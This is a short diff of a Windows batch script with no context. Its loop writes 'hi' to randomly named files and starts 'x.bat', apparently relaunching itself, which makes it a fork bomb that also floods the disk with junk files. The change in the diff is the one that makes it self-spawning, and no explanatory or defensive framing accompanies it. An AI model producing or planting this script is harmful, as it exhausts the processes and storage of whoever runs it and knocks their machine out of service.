@@ -1,4 +1,4 @@
 x:
 echo hi > %random%
-start file.bat
+start x.bat
 goto x:
